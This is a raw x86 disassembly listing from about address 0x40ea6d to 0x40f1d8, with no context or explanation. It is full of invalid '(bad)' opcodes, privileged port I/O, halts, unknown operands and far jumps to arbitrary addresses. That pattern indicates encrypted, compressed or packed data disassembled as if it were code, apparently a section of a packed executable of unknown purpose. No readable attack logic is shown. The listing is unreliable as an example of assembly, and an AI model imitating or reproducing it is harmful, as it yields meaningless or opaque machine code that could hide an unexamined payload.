  40ea6d:	(bad)  
  40ea6e:	mov    esp,DWORD PTR [eax-0x7ba6e929]
  40ea74:	jo     0x40ea10
  40ea76:	int    0xc6
  40ea78:	je     0x40ea3b
  40ea7a:	or     edi,DWORD PTR [eax]
  40ea7c:	(bad)  
  40ea7d:	loopne 0x40eab9
  40ea7f:	div    DWORD PTR [ecx-0x23]
  40ea82:	cli    
  40ea83:	pop    edi
  40ea84:	mov    eax,ds:0xcc77bbdd
  40ea89:	dec    ecx
  40ea8a:	pop    ds
  40ea8b:	or     ch,BYTE PTR [eax]
  40ea8d:	je     0x40ea94
  40ea8f:	jecxz  0x40eaea
  40ea91:	xchg   BYTE PTR [eax],bl
  40ea93:	shl    ebx,0xbb
  40ea96:	mov    dl,0xdb
  40ea98:	jp     0x40ea48
  40ea9a:	mov    esi,0xbd1daa67
  40ea9f:	loop   0x40ea21
  40eaa1:	ror    BYTE PTR [ebx+0x10e52444],0x49
  40eaa8:	dec    ecx
  40eaa9:	mov    ebx,0x1da964ba
  40eaae:	push   es
  40eaaf:	test   BYTE PTR cs:[ebx],cl
  40eab2:	dec    esi
  40eab3:	mov    ?,WORD PTR [ecx+ecx*2-0x3f07f58b]
  40eaba:	fs push edi
  40eabc:	push   ds
  40eabd:	dec    edi
  40eabe:	and    eax,0xffc58c3
  40eac3:	mov    edx,0x74578149
  40eac8:	fcmovne st,st(5)
  40eaca:	cmp    edx,DWORD PTR [ebp+0x19afa5c]
  40ead0:	sub    ebx,edx
  40ead2:	pop    ecx
  40ead3:	dec    edx
  40ead4:	pop    ds
  40ead5:	jmp    0x40eb2d
  40ead7:	mov    esi,0xd1915703
  40eadc:	push   edi
  40eadd:	fs (bad) 
  40eadf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eae0:	addr16 out 0x63,al
  40eae3:	mov    eax,0xf0d51775
  40eae8:	inc    esp
  40eae9:	dec    esi
  40eaea:	pop    esi
  40eaeb:	pusha  
  40eaec:	inc    ebp
  40eaed:	mov    DWORD PTR [eax-0x73],ecx
  40eaf0:	jmp    0xfb72:0xfeb1eeb9
  40eaf7:	jns    0x40eb47
  40eaf9:	call   0x6fa5:0x1bd3bfae
  40eb00:	inc    edi
  40eb01:	pop    ss
  40eb02:	jmp    0x11868649
  40eb07:	or     al,BYTE PTR [ebx+esi*1-0x58ff552f]
  40eb0e:	push   ecx
  40eb0f:	jno    0x40eb72
  40eb11:	or     BYTE PTR [eax+0x47756b9],al
  40eb17:	push   edi
  40eb18:	adc    bh,bh
  40eb1a:	sub    al,0x79
  40eb1c:	pop    edi
  40eb1d:	xor    al,BYTE PTR [ebx]
  40eb1f:	push   ecx
  40eb20:	cmp    edx,edx
  40eb22:	ret    0xcd5d
  40eb25:	cld    
  40eb26:	pop    edi
  40eb27:	sti    
  40eb28:	mov    ecx,0x7dfdda76
  40eb2d:	leave  
  40eb2e:	out    0xec,eax
  40eb30:	inc    esp
  40eb31:	xchg   ecx,eax
  40eb32:	clc    
  40eb33:	sub    dl,BYTE PTR [edx+eax*8-0x49]
  40eb37:	test   eax,0xca4c95a0
  40eb3c:	jle    0x40eb8b
  40eb3e:	cli    
  40eb3f:	adc    al,dl
  40eb41:	icebp  
  40eb42:	aam    0x32
  40eb44:	sub    eax,0x66727bde
  40eb49:	fwait
  40eb4a:	sbb    dh,BYTE PTR ds:0x8b0862cd
  40eb50:	inc    eax
  40eb51:	xor    edi,ebx
  40eb53:	repnz and eax,0xe02fa733
  40eb59:	push   edx
  40eb5a:	or     edx,0xd132d1fb
  40eb60:	shl    ecx,0x3b
  40eb63:	dec    esi
  40eb64:	jns    0x40eb07
  40eb66:	pop    ecx
  40eb67:	adc    edx,DWORD PTR [edi]
  40eb69:	and    al,BYTE PTR [edi-0x52d64d9b]
  40eb6f:	mov    ecx,0xfb15d81e
  40eb74:	aas    
  40eb75:	ss popf 
  40eb77:	aaa    
  40eb78:	sti    
  40eb79:	jmp    0x40ebc4
  40eb7b:	test   ah,ch
  40eb7d:	stos   DWORD PTR es:[edi],eax
  40eb7e:	hlt    
  40eb7f:	push   es
  40eb80:	sub    eax,0xf222fefc
  40eb85:	mov    WORD PTR [eax],fs
  40eb87:	les    eax,FWORD PTR [edx]
  40eb89:	in     eax,0xf6
  40eb8b:	pop    eax
  40eb8c:	cmc    
  40eb8d:	jg     0x40ebcc
  40eb8f:	scas   eax,DWORD PTR es:[edi]
  40eb90:	xlat   BYTE PTR ds:[ebx]
  40eb91:	inc    ebx
  40eb92:	add    ecx,DWORD PTR [edi]
  40eb94:	push   ecx
  40eb95:	or     bl,ch
  40eb97:	mov    ebx,0xeb0525f9
  40eb9c:	pop    es
  40eb9d:	and    eax,0x95d608c2
  40eba2:	or     edi,eax
  40eba4:	ds dec ecx
  40eba6:	pop    ecx
  40eba7:	ins    DWORD PTR es:[edi],dx
  40eba8:	xchg   edx,ecx
  40ebaa:	lea    edx,[ebx+0x51]
  40ebad:	inc    ebp
  40ebae:	pop    ebx
  40ebaf:	(bad)  
  40ebb0:	adc    BYTE PTR [edi+0x1],ch
  40ebb3:	lods   al,BYTE PTR ds:[esi]
  40ebb4:	dec    ebp
  40ebb5:	call   0x11fb2481
  40ebba:	dec    edx
  40ebbb:	scas   al,BYTE PTR es:[edi]
  40ebbc:	jmp    0x2b857990
  40ebc1:	shl    BYTE PTR [edi],1
  40ebc3:	cdq    
  40ebc4:	(bad)  
  40ebc6:	lods   al,BYTE PTR ds:[esi]
  40ebc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebc8:	cmc    
  40ebc9:	out    dx,eax
  40ebca:	out    0xe8,al
  40ebcc:	pop    ebp
  40ebcd:	aam    0x27
  40ebcf:	out    dx,al
  40ebd0:	cmc    
  40ebd1:	or     al,0x7d
  40ebd3:	xchg   ecx,eax
  40ebd4:	ins    BYTE PTR es:[edi],dx
  40ebd5:	test   al,0x8
  40ebd7:	dec    edi
  40ebd8:	out    0x42,eax
  40ebda:	iret   
  40ebdb:	(bad)  
  40ebdc:	fldcw  WORD PTR [ebp+0x1]
  40ebdf:	out    0x94,eax
  40ebe1:	pop    edi
  40ebe2:	mov    esp,0x200f3ddf
  40ebe7:	jb     0x40ebc3
  40ebe9:	retf   
  40ebea:	(bad)  
  40ebeb:	mov    ds:0x6fbe080d,eax
  40ebf0:	ins    DWORD PTR es:[edi],dx
  40ebf1:	lea    edi,[ecx+0x76]
  40ebf4:	dec    ebp
  40ebf5:	mov    edi,0xf0e7c5e5
  40ebfa:	fwait
  40ebfb:	js     0x40eb9e
  40ebfd:	int3   
  40ebfe:	mov    WORD PTR [eax+0x3596e1b0],?
  40ec04:	push   ds
  40ec05:	adc    eax,0xe5019fd4
  40ec0a:	in     al,dx
  40ec0b:	jnp    0x40ec47
  40ec0d:	iret   
  40ec0e:	pop    ebx
  40ec0f:	xor    al,0x84
  40ec11:	(bad)  
  40ec12:	adc    BYTE PTR [eax],bh
  40ec14:	jmp    0x83ad:0xc5bd177b
  40ec1b:	add    BYTE PTR [ebx],ch
  40ec1d:	addr16 dec ebp
  40ec1f:	sahf   
  40ec20:	pop    ebp
  40ec21:	adc    eax,0x4da1ee4a
  40ec26:	jbe    0x40ec39
  40ec28:	mov    esi,0x9ca2e259
  40ec2d:	sar    BYTE PTR [ebp+0x2425f4f9],cl
  40ec33:	add    eax,DWORD PTR [ecx+edx*1]
  40ec36:	into   
  40ec37:	lahf   
  40ec38:	(bad)  
  40ec39:	std    
  40ec3a:	sbb    DWORD PTR [esi+0x27],esi
  40ec3d:	out    0x20,eax
  40ec3f:	adc    bl,0x89
  40ec42:	jnp    0x40ecaa
  40ec44:	iret   
  40ec45:	popf   
  40ec46:	jb     0x40ec0f
  40ec48:	fs jg  0x40ec38
  40ec4b:	vunpcklpd ymm4,ymm3,YMMWORD PTR [edi-0x7a93013b]
  40ec53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec54:	sbb    ebp,DWORD PTR [ebx+0x33a50748]
  40ec5a:	xchg   edx,eax
  40ec5b:	in     al,0xd7
  40ec5d:	add    DWORD PTR [ebp+0x19],edx
  40ec60:	test   al,0x18
  40ec62:	push   ss
  40ec63:	mov    esi,0x35ea7750
  40ec68:	jno    0x40ec61
  40ec6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec6b:	stos   DWORD PTR es:[edi],eax
  40ec6c:	not    ch
  40ec6e:	xchg   ebp,eax
  40ec6f:	dec    esi
  40ec70:	sub    esi,DWORD PTR [ebp-0x6d]
  40ec73:	jecxz  0x40ec9e
  40ec75:	mov    edx,0x5d42602a
  40ec7a:	mov    ebx,0x5a997d02
  40ec7f:	repz aad 0x27
  40ec82:	clc    
  40ec83:	cmp    al,0x4b
  40ec85:	mov    edi,DWORD PTR [eax+0x69]
  40ec88:	adc    edx,DWORD PTR [edi+ebp*4+0x1b56338e]
  40ec8f:	sbb    ch,BYTE PTR [esp+edi*8+0x71177ec3]
  40ec96:	mov    esi,0x76498abf
  40ec9b:	push   edx
  40ec9c:	or     eax,0x5078b202
  40eca1:	cmc    
  40eca2:	addr16 inc bx
  40eca5:	mov    eax,0x537e303b
  40ecaa:	inc    ebx
  40ecab:	inc    esi
  40ecac:	imul   edx,DWORD PTR [esi+ecx*1-0xe],0xffffff83
  40ecb1:	xor    BYTE PTR [esi-0x1a],ah
  40ecb4:	xor    esi,DWORD PTR [edi-0x761a46ca]
  40ecba:	imul   BYTE PTR [eax-0x4d03b5e3]
  40ecc0:	nop
  40ecc1:	adc    ebp,eax
  40ecc3:	and    ebx,esi
  40ecc5:	inc    esi
  40ecc6:	push   ecx
  40ecc7:	xchg   edx,eax
  40ecc8:	into   
  40ecc9:	or     eax,0xdfdcee37
  40ecce:	cmp    eax,0x906b1c53
  40ecd3:	(bad)  
  40ecd4:	in     al,0x20
  40ecd6:	scas   al,BYTE PTR es:[edi]
  40ecd7:	inc    esp
  40ecd8:	dec    eax
  40ecd9:	lea    ebx,[esi-0x79]
  40ecdc:	mov    WORD PTR [ecx],fs
  40ecde:	mov    al,ds:0x22559342
  40ece3:	das    
  40ece4:	in     al,dx
  40ece5:	mov    ah,0x5e
  40ece7:	pop    eax
  40ece8:	sub    BYTE PTR [ebp-0x259f1675],bl
  40ecee:	ret    0x6ef6
  40ecf1:	int3   
  40ecf2:	pop    ds
  40ecf3:	adc    ecx,DWORD PTR [ecx-0x4]
  40ecf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecf7:	data16 sub dh,BYTE PTR [eax-0x37569b43]
  40ecfe:	fimul  DWORD PTR [edi+0x70]
  40ed01:	mov    esp,0xbfa72161
  40ed06:	ds inc edx
  40ed08:	retf   
  40ed09:	add    ebx,DWORD PTR [esi]
  40ed0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed0c:	lods   eax,DWORD PTR ds:[esi]
  40ed0d:	and    dl,dh
  40ed0f:	hlt    
  40ed10:	test   eax,0xc0250a00
  40ed15:	iret   
  40ed16:	mov    eax,DWORD PTR [ecx-0x16]
  40ed19:	xchg   edi,eax
  40ed1a:	cmp    al,0x49
  40ed1c:	pop    edi
  40ed1d:	mov    ch,0xee
  40ed1f:	jno    0x40ecc7
  40ed21:	mov    al,0xcb
  40ed23:	xor    al,0x1c
  40ed25:	jbe    0x40ecaf
  40ed27:	xchg   esi,eax
  40ed28:	mov    cl,0x33
  40ed2a:	stos   BYTE PTR es:[edi],al
  40ed2b:	fucomi st,st(2)
  40ed2d:	add    bh,ch
  40ed2f:	lds    ebp,FWORD PTR [ebp-0x39]
  40ed32:	test   DWORD PTR [eax+edi*2+0x2ff48ba9],ebp
  40ed39:	out    0x7e,al
  40ed3b:	jb     0x40edba
  40ed3d:	ror    BYTE PTR ds:0x6188f97d,1
  40ed43:	aas    
  40ed44:	mov    dh,0x35
  40ed46:	aam    0x25
  40ed48:	call   0x1f78:0x52e919e0
  40ed4f:	mov    dl,0x71
  40ed51:	xchg   edi,eax
  40ed52:	test   BYTE PTR [ecx],bh
  40ed54:	repz adc eax,0xd46a6f8c
  40ed5a:	mov    dl,BYTE PTR [edi+0x5b]
  40ed5d:	push   edx
  40ed5e:	dec    edi
  40ed5f:	test   BYTE PTR [eax-0x1],ch
  40ed62:	cdq    
  40ed63:	(bad)  
  40ed64:	(bad)  [edx]
  40ed66:	or     cl,BYTE PTR [esi-0x27]
  40ed69:	(bad)  
  40ed6a:	out    dx,eax
  40ed6b:	ds retf 0x3008
  40ed6f:	sbb    edi,DWORD PTR [edi+0x3608262f]
  40ed75:	fadd   DWORD PTR [edx+edi*2+0x50]
  40ed79:	out    0x5b,al
  40ed7b:	lock adc al,0xf2
  40ed7e:	popa   
  40ed7f:	pop    esp
  40ed80:	and    edi,DWORD PTR [esi-0x4171a142]
  40ed86:	idiv   DWORD PTR [eax-0x18da96e4]
  40ed8c:	test   eax,0xebd5f884
  40ed91:	jns    0x40ed5f
  40ed93:	push   ds
  40ed94:	aas    
  40ed95:	cmp    al,al
  40ed97:	test   BYTE PTR [ecx],dh
  40ed99:	pop    es
  40ed9a:	data16 int 0x73
  40ed9d:	xchg   DWORD PTR [edx+0x49d50cd4],ebp
  40eda3:	ret    
  40eda4:	sbb    DWORD PTR [ebp+0xd],ebp
  40eda7:	dec    ecx
  40eda8:	inc    ecx
  40eda9:	(bad)  
  40edab:	fidivr DWORD PTR [ebp+eax*8-0x692607e9]
  40edb2:	push   esp
  40edb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edb4:	xchg   ebp,eax
  40edb5:	cmp    eax,0xfa1d3e0b
  40edba:	dec    edx
  40edbb:	mov    ds,ebx
  40edbd:	call   0xf562:0x57d7f292
  40edc4:	push   ds
  40edc5:	pop    esp
  40edc6:	push   cx
  40edc8:	inc    esi
  40edc9:	adc    cl,BYTE PTR [eax+eiz*1]
  40edcc:	in     al,0xfa
  40edce:	aad    0xb6
  40edd0:	scas   al,BYTE PTR es:[edi]
  40edd1:	mov    bh,0x8b
  40edd3:	sbb    eax,0x40e98df3
  40edd8:	mov    BYTE PTR [ecx],bl
  40edda:	pop    ebx
  40eddb:	inc    ecx
  40eddc:	or     dh,bh
  40edde:	fist   DWORD PTR [edx]
  40ede0:	cmp    DWORD PTR [esi-0x6d],ebx
  40ede3:	in     al,0xb8
  40ede5:	mov    ecx,0x6cf04352
  40edea:	dec    edi
  40edeb:	popf   
  40edec:	pop    ss
  40eded:	test   eax,0xeb18b7d9
  40edf2:	(bad)  
  40edf3:	leave  
  40edf4:	scas   al,BYTE PTR es:[edi]
  40edf5:	jge    0x40ed8b
  40edf7:	cmp    DWORD PTR [ebx],esi
  40edf9:	xchg   ecx,eax
  40edfa:	inc    edx
  40edfb:	jns    0x40ed8b
  40edfd:	rcr    BYTE PTR ds:0x8918a3cc,0x54
  40ee04:	pop    eax
  40ee05:	xchg   ebx,eax
  40ee06:	mov    ch,0xd2
  40ee09:	pop    eax
  40ee0a:	cli    
  40ee0b:	pop    eax
  40ee0c:	(bad)  
  40ee0d:	sbb    ah,ch
  40ee0f:	(bad)  
  40ee10:	arpl   WORD PTR [ebp-0x717084c8],ax
  40ee16:	repnz inc ecx
  40ee18:	adc    bl,dh
  40ee1a:	call   0xd5eee511
  40ee1f:	cld    
  40ee20:	in     eax,dx
  40ee21:	xor    ch,ah
  40ee23:	fdivp  st(3),st
  40ee25:	lods   eax,DWORD PTR ds:[esi]
  40ee26:	adc    al,0x43
  40ee28:	xchg   edx,eax
  40ee29:	sti    
  40ee2a:	pushf  
  40ee2b:	sub    esi,ebx
  40ee2d:	xor    al,0xd6
  40ee2f:	mov    dh,0x1d
  40ee31:	pop    esi
  40ee32:	shr    dh,0xce
  40ee35:	mov    WORD PTR [eax+0x56],?
  40ee38:	jl     0x40ee42
  40ee3a:	dec    ebx
  40ee3b:	jno    0x40edcf
  40ee3d:	lods   eax,DWORD PTR ds:[esi]
  40ee3e:	mov    dl,0x76
  40ee40:	cmp    eax,0x27e491ad
  40ee45:	(bad)  
  40ee46:	hlt    
  40ee47:	(bad)  
  40ee48:	rep ins BYTE PTR es:[edi],dx
  40ee4a:	rol    DWORD PTR [ecx+0x6d],1
  40ee4d:	fs daa 
  40ee4f:	cmp    BYTE PTR [esi],dh
  40ee51:	adc    DWORD PTR [edx+0x5f],eax
  40ee54:	mov    BYTE PTR [eax-0x6f871a33],dh
  40ee5a:	lea    eax,[ebp-0x39]
  40ee5d:	mov    DWORD PTR [esi-0x445d58c3],eax
  40ee63:	nop
  40ee64:	daa    
  40ee65:	sub    eax,0x10abe728
  40ee6a:	test   eax,0xd8e70560
  40ee6f:	popa   
  40ee70:	xor    ah,BYTE PTR [edi+0x2517b18e]
  40ee76:	xor    DWORD PTR [ebx-0x58859f7e],ecx
  40ee7c:	popf   
  40ee7d:	in     al,0x6e
  40ee7f:	test   eax,0x488ae251
  40ee84:	mov    eax,DWORD PTR [ecx+0x399084f2]
  40ee8a:	mov    ch,0x3a
  40ee8c:	repnz mov esp,0x4f520756
  40ee92:	inc    esp
  40ee93:	inc    ecx
  40ee94:	sub    al,0xee
  40ee96:	adc    eax,DWORD PTR [edi-0x26]
  40ee99:	sbb    eax,0x15e42eb8
  40ee9e:	adc    ch,al
  40eea0:	pop    esi
  40eea1:	mov    dl,0xf9
  40eea3:	mov    ch,0x6
  40eea5:	jae    0x40ee67
  40eea7:	pop    ebp
  40eea8:	jbe    0x40ee7b
  40eeaa:	out    dx,al
  40eeab:	(bad)  
  40eeac:	neg    dl
  40eeae:	daa    
  40eeaf:	or     ebx,edx
  40eeb1:	mov    edx,DWORD PTR [edx+edx*1-0x2f]
  40eeb5:	cli    
  40eeb6:	or     DWORD PTR [ebp+eax*8-0xb],esp
  40eeba:	cmc    
  40eebb:	mov    gs,WORD PTR [esi-0x4150b48b]
  40eec1:	add    cl,bh
  40eec3:	mov    esi,DWORD PTR [ecx-0x2a]
  40eec6:	pop    ds
  40eec7:	mov    esi,0x11c10f1
  40eecc:	inc    eax
  40eecd:	imul   eax,DWORD PTR [edi+0x69],0x1aceec85
  40eed4:	aad    0x2b
  40eed6:	jmp    0x6bb5:0xaccf68b5
  40eedd:	cmp    ah,ch
  40eedf:	xor    edx,eax
  40eee1:	ins    BYTE PTR es:[edi],dx
  40eee2:	xor    al,0x7a
  40eee4:	inc    eax
  40eee5:	loope  0x40eed4
  40eee7:	jne    0x40ee7e
  40eee9:	sbb    esi,DWORD PTR [ebx+0x3da17c6a]
  40eeef:	int    0x73
  40eef1:	sub    ah,BYTE PTR [eax]
  40eef3:	(bad)
  40eef6:	nop
  40eef7:	or     dl,BYTE PTR [esi+0x30774d49]
  40eefd:	and    BYTE PTR [edi+edx*2-0x9cf92af],bl
  40ef04:	imul   esp,DWORD PTR [ebx-0x41],0x13
  40ef08:	inc    edi
  40ef09:	test   al,0xd1
  40ef0b:	and    ecx,ebx
  40ef0d:	in     al,dx
  40ef0e:	test   BYTE PTR ds:0x3782c764,0x12
  40ef15:	repz pushf 
  40ef17:	push   0x4ac80f8b
  40ef1c:	inc    ecx
  40ef1d:	and    dl,0x13
  40ef20:	out    0x1e,al
  40ef22:	xchg   BYTE PTR [esi],dl
  40ef24:	lods   al,BYTE PTR ds:[esi]
  40ef25:	gs call 0xa93a3533
  40ef2b:	in     eax,0x9d
  40ef2d:	mov    edx,cs
  40ef2f:	jno    0x40ef56
  40ef31:	dec    eax
  40ef32:	mov    gs,WORD PTR [ebx]
  40ef34:	cmp    bl,0x2b
  40ef37:	mul    ebx
  40ef39:	add    al,0xbc
  40ef3b:	inc    edx
  40ef3c:	test   eax,ecx
  40ef3e:	adc    eax,0x3a859731
  40ef43:	pop    ebx
  40ef44:	or     al,0xdd
  40ef46:	push   cs
  40ef47:	sub    edi,DWORD PTR [esi+0x38083757]
  40ef4d:	ja     0x40efaa
  40ef4f:	cdq    
  40ef50:	in     eax,dx
  40ef51:	int    0xc8
  40ef53:	ja     0x40ef2b
  40ef55:	xor    edx,ebp
  40ef57:	push   cs
  40ef58:	adc    eax,0x4431f64c
  40ef5d:	cmp    al,0x69
  40ef5f:	push   edx
  40ef60:	cmp    BYTE PTR [ebx-0x17],dh
  40ef63:	sub    BYTE PTR ds:0x12d36cba,dh
  40ef69:	cmc    
  40ef6a:	xchg   ecx,eax
  40ef6b:	xchg   ebp,eax
  40ef6c:	pop    ebx
  40ef6d:	jecxz  0x40efdb
  40ef6f:	bound  ebx,QWORD PTR [esi-0x172158bc]
  40ef75:	jno    0x40ef22
  40ef77:	cmp    edi,esp
  40ef79:	jmp    0xc6c0:0x7050e900
  40ef80:	jne    0x40ef3c
  40ef82:	sub    al,BYTE PTR [edx]
  40ef84:	gs cld 
  40ef86:	aad    0x9
  40ef88:	and    al,0x45
  40ef8a:	loope  0x40ef75
  40ef8c:	iret   
  40ef8d:	inc    ebp
  40ef8e:	xchg   si,ax
  40ef90:	add    DWORD PTR [esi-0x64],0x58
  40ef94:	cmp    bh,ah
  40ef96:	or     al,dl
  40ef98:	xchg   edx,eax
  40ef99:	ror    BYTE PTR [esi+0x16deb712],0x94
  40efa0:	jle    0x40ef4c
  40efa2:	push   ebx
  40efa3:	stos   BYTE PTR es:[edi],al
  40efa4:	iret   
  40efa5:	sub    ebx,DWORD PTR [edi-0xeaec9a5]
  40efab:	mov    ecx,0xe4f0b8bd
  40efb0:	mov    ecx,0x38abf196
  40efb5:	aam    0x78
  40efb7:	inc    esp
  40efb8:	int3   
  40efb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efba:	stos   BYTE PTR es:[edi],al
  40efbb:	dec    ebx
  40efbc:	test   al,0x19
  40efbe:	push   ebx
  40efbf:	dec    ebx
  40efc0:	push   esi
  40efc1:	call   0xbbba:0x560ca64b
  40efc8:	dec    ebx
  40efc9:	retf   
  40efca:	pop    edi
  40efcb:	in     eax,dx
  40efcc:	xlat   BYTE PTR ds:[ebx]
  40efcd:	fucom  st(5)
  40efcf:	push   ss
  40efd0:	adc    eax,0x9733f5ac
  40efd5:	pushf  
  40efd6:	or     ch,ah
  40efd8:	adc    esi,ebp
  40efda:	add    DWORD PTR [edx+eax*2+0x39f36db0],0x60
  40efe2:	cmp    ebp,DWORD PTR [ecx-0x4b]
  40efe5:	sub    BYTE PTR [edi+ecx*8-0x48],dl
  40efe9:	es clc 
  40efeb:	es out 0x6d,al
  40efee:	jge    0x40f065
  40eff0:	push   ds
  40eff1:	dec    edi
  40eff2:	mov    dl,bh
  40eff4:	xchg   BYTE PTR [ebx-0x5e],bh
  40eff7:	loope  0x40ef97
  40eff9:	xchg   ebx,eax
  40effa:	ret    
  40effb:	pop    ecx
  40effc:	(bad)  
  40effd:	out    0xa8,al
  40efff:	sbb    al,BYTE PTR [edi]
  40f001:	mov    ds,ebp
  40f003:	jae    0x40eff0
  40f005:	mov    ch,BYTE PTR [edx+0x1a]
  40f008:	jecxz  0x40f04d
  40f00a:	cmp    ebp,edx
  40f00c:	pop    es
  40f00d:	dec    edx
  40f00e:	jbe    0x40f061
  40f010:	jl     0x40ef94
  40f012:	jo     0x40f009
  40f014:	pop    edi
  40f015:	push   cs
  40f016:	cmp    eax,0xa3590164
  40f01b:	in     eax,dx
  40f01c:	or     BYTE PTR [edi+0x2e0ca76f],bl
  40f022:	mov    bl,0x9b
  40f024:	xor    DWORD PTR [ebp+0x65],0xe2cbaa16
  40f02b:	ss out dx,al
  40f02d:	jmp    0x394749c6
  40f032:	xchg   esi,eax
  40f033:	lds    eax,FWORD PTR [ecx]
  40f035:	mul    BYTE PTR [edi+edx*4+0x2d]
  40f039:	daa    
  40f03a:	(bad)  
  40f03b:	and    eax,0x1d54fde
  40f040:	stc    
  40f041:	shl    DWORD PTR [ecx],0x9f
  40f044:	loop   0x40f048
  40f046:	pop    edi
  40f047:	das    
  40f048:	add    al,BYTE PTR [esi]
  40f04a:	push   es
  40f04b:	inc    edx
  40f04c:	jo     0x40f086
  40f04e:	jbe    0x40f058
  40f050:	in     al,dx
  40f051:	pcmpgtb mm2,QWORD PTR [ecx+0x650ca550]
  40f058:	cli    
  40f059:	ins    DWORD PTR es:[edi],dx
  40f05a:	mov    edx,0x34dbcc71
  40f05f:	test   eax,0x25e07449
  40f064:	jmp    0xb73848c7
  40f069:	dec    esi
  40f06a:	idiv   DWORD PTR [edx]
  40f06c:	sahf   
  40f06d:	mov    DWORD PTR [ebp-0xd],ebx
  40f070:	std    
  40f071:	loopne 0x40f034
  40f073:	push   DWORD PTR [eax+0x18]
  40f076:	out    0xba,eax
  40f078:	aam    0x99
  40f07a:	(bad)  
  40f07b:	ss xchg esi,eax
  40f07d:	inc    eax
  40f07e:	rcl    BYTE PTR [edi],1
  40f080:	std    
  40f081:	jae    0x40f04c
  40f083:	ins    BYTE PTR es:[edi],dx
  40f084:	mov    esi,0x73e7467d
  40f089:	and    eax,0xccb76655
  40f08e:	in     eax,dx
  40f08f:	test   al,0x1b
  40f091:	cld    
  40f092:	cmc    
  40f093:	retf   
  40f094:	or     bl,BYTE PTR [eax-0x6ee767a2]
  40f09a:	fs cmp al,0x72
  40f09d:	inc    esi
  40f09e:	lock mov dh,0xb8
  40f0a1:	inc    ecx
  40f0a2:	push   ebx
  40f0a3:	xchg   edi,eax
  40f0a4:	shr    BYTE PTR [ebx-0x2eefdc96],1
  40f0aa:	fwait
  40f0ab:	repnz xchg ecx,eax
  40f0ad:	or     edi,DWORD PTR [edi-0x1f69ec22]
  40f0b3:	es jmp 0xf862:0x8254ad3d
  40f0bb:	or     bh,BYTE PTR [ebp-0x6651d4cd]
  40f0c1:	sti    
  40f0c2:	xchg   BYTE PTR [ecx],al
  40f0c4:	xchg   esi,eax
  40f0c5:	fcmovnu st,st(3)
  40f0c7:	cwde   
  40f0c8:	add    DWORD PTR [ebx],ebx
  40f0ca:	dec    ecx
  40f0cb:	call   0x560a:0x1a5c9d07
  40f0d2:	mov    edi,0x3cb1dc7c
  40f0d7:	stos   BYTE PTR es:[edi],al
  40f0d8:	enter  0x3b28,0xbc
  40f0dc:	fisttp DWORD PTR fs:[bx+di-0xc]
  40f0e1:	test   eax,0x9a66d5c9
  40f0e6:	jae    0x40f150
  40f0e8:	lods   eax,DWORD PTR ds:[esi]
  40f0e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0ea:	xchg   esp,eax
  40f0eb:	fstp   DWORD PTR [ebx]
  40f0ed:	push   ecx
  40f0ee:	ss adc al,ah
  40f0f1:	xchg   ebx,eax
  40f0f2:	sbb    dh,BYTE PTR ds:0xd37fa9ab
  40f0f8:	inc    edi
  40f0f9:	mov    bl,0x1f
  40f0fb:	mov    edi,0x51a0a557
  40f100:	push   ss
  40f101:	or     BYTE PTR [eax+eiz*1+0x68fc1d12],bh
  40f108:	jecxz  0x40f15f
  40f10a:	lods   eax,DWORD PTR ds:[esi]
  40f10b:	xchg   esi,eax
  40f10c:	rcr    DWORD PTR ds:0x206846e,1
  40f112:	lock jp 0x40f0a1
  40f115:	mov    esp,0x40028314
  40f11a:	data16 test dl,0x80
  40f11e:	push   cs
  40f11f:	pop    ss
  40f120:	sbb    ecx,0x27379c34
  40f126:	mov    ebp,0x3a0622d9
  40f12b:	and    DWORD PTR [esi+0x425183b2],ebx
  40f131:	ret    
  40f132:	and    al,0x3f
  40f134:	icebp  
  40f135:	push   ecx
  40f136:	fsub   DWORD PTR [eax-0x5d96f8d7]
  40f13c:	jl     0x40f191
  40f13e:	jge    0x40f15f
  40f140:	rcr    DWORD PTR [ecx-0x3b72dc7a],cl
  40f146:	jle    0x40f0fb
  40f148:	inc    esp
  40f149:	shl    DWORD PTR [edi-0x3f775ad2],0x90
  40f150:	jl     0x40f0ff
  40f152:	cmp    BYTE PTR [eax+0x4fb76797],bh
  40f158:	mov    eax,ds:0x8401ebe3
  40f15d:	sahf   
  40f15e:	stos   BYTE PTR es:[edi],al
  40f15f:	pop    ebx
  40f160:	pop    es
  40f161:	mov    ds:0xbdeb3542,al
  40f166:	lods   al,BYTE PTR ds:[esi]
  40f167:	ja     0x40f190
  40f169:	out    0x39,eax
  40f16b:	inc    esp
  40f16c:	xor    esi,DWORD PTR [esi-0x5a365785]
  40f172:	mov    BYTE PTR [edi-0x1018a98],dh
  40f178:	jp     0x40f14c
  40f17a:	lock xrelease adc DWORD PTR [ecx+ebx*1+0x2db3ae0c],edx
  40f183:	test   DWORD PTR [edx],0x745e976e
  40f189:	hlt    
  40f18a:	ins    DWORD PTR es:[edi],dx
  40f18b:	mov    ds:0xb6c5d6fd,al
  40f190:	push   edx
  40f191:	adc    DWORD PTR [ecx+0x38],0xd679b1d9
  40f198:	xchg   eax,ebp
  40f19a:	lods   al,BYTE PTR ds:[esi]
  40f19c:	add    ecx,ecx
  40f19e:	cld    
  40f19f:	dec    ecx
  40f1a1:	imul   ebx,DWORD PTR [ebp+0x68374ce6],0x5a1b96b1
  40f1ab:	sub    al,0x8d
  40f1ad:	jb     0x40f14b
  40f1af:	adc    ebp,ebp
  40f1b1:	ficom  DWORD PTR [ecx]
  40f1b3:	test   BYTE PTR [ebx],ch
  40f1b5:	test   al,0x5
  40f1b7:	xor    ebx,ebx
  40f1b9:	xor    bl,BYTE PTR [edx]
  40f1bb:	idiv   DWORD PTR [ecx]
  40f1bd:	rcr    BYTE PTR [edx+eiz*2-0x17f40ae3],cl
  40f1c4:	div    DWORD PTR [esi]
  40f1c6:	dec    ebx
  40f1c7:	loopne 0x40f155
  40f1c9:	mov    ecx,0x2ffd35f8
  40f1ce:	mov    esp,0x7d52fd7
  40f1d3:	and    ah,0xa5
  40f1d6:	sub    ah,cl
  40f1d8:	mov    edx,0x1cb5d8c4
